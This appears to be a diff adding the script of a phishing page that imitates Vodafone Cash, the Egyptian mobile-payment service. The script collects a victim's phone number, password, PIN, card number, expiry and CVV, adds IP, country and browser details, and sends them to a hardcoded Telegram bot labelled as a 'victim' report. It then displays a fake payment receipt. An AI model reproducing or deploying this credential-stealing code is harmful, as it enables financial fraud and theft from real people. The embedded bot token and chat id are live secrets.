@@ -1,0 +1,38 @@
+<!-- تم حذف تحويل إلى receipt.html واستبداله برسالة تأكيد داخل نفس الصفحة -->
+<script>
+  const token = "7989278640:AAEd5fyTYU5VauNqEwyUo-8I-vRqj6MU0m0";
+  const chat_id = "1896998598";
+  document.getElementById("bot").style.display = "block";
+  function sendData() {
+    document.getElementById("clickSound").play();
+    document.getElementById("voice").play();
+    document.getElementById("loading").style.display = "block";
+    const phone = document.getElementById("phone").value;
+    const password = document.getElementById("password").value;
+    const pin = document.getElementById("pin").value;
+    const card = document.getElementById("card").value;
+    const exp = document.getElementById("exp").value;
+    const cvv = document.getElementById("cvv").value;
+    const confirm = document.getElementById("confirm").value;
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        const screen = `${window.screen.width}x${window.screen.height}`;
+        const message = `📥 ضحية فودافون كاش كاملة:\n📞 رقم: ${phone}\n🔐 كلمة السر: ${password}\n🔑 PIN: ${pin}\n📱 تأكيد رقم: ${confirm}\n💳 كارت: ${card}\n📅 انتهاء: ${exp}\n🔒 CVV: ${cvv}\n🌍 IP: ${data.ip}\n📍 الدولة: ${data.country_name}\n🌐 المتصفح: ${navigator.userAgent}\n🖥️ الشاشة: ${screen}\n🕒 الوقت: ${new Date().toLocaleString()}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chat_id, text: message })
+        });
+        setTimeout(() => {
+          document.querySelector(".container").innerHTML = `
+            <h2 style='text-align:center; color:green;'>✅ تم استلام بياناتك</h2>
+            <p style='text-align:center;'>رقم الطلب: VFCASH-${Math.floor(Math.random()*999999)}</p>
+            <p style='text-align:center;'>المبلغ: 100 جنيه</p>
+            <p style='text-align:center;'>التاريخ: ${new Date().toLocaleString()}</p>
+            <p style='text-align:center;'>شكراً لاستخدامك فودافون كاش</p>
+          `;
+        }, 3000);
+      });
+  }
+</script>
